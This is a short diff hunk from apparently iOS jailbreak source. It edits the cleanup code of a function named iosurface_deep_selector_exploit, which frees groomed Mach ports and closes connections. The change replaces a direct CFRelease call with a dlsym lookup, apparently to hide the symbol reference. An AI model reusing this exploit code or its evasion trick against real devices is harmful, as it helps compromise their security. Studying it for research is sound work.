@@ -37502,7 +37502,7 @@ void iosurface_deep_selector_exploit(ISRLogBlock log, ISRDoneBlock done) {
 
                         jb42_freeGroom(gPorts, gCount);
                         jb41_dropPort(wp);
-                        CFRelease((__bridge CFTypeRef)surf);
+                        { typedef void(*cfrel_fn)(CFTypeRef); cfrel_fn rel = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease"); if (rel && surf) rel((CFTypeRef)surf); }
                     }
                     sym_close(oConn);
                     sym_close(gConn);
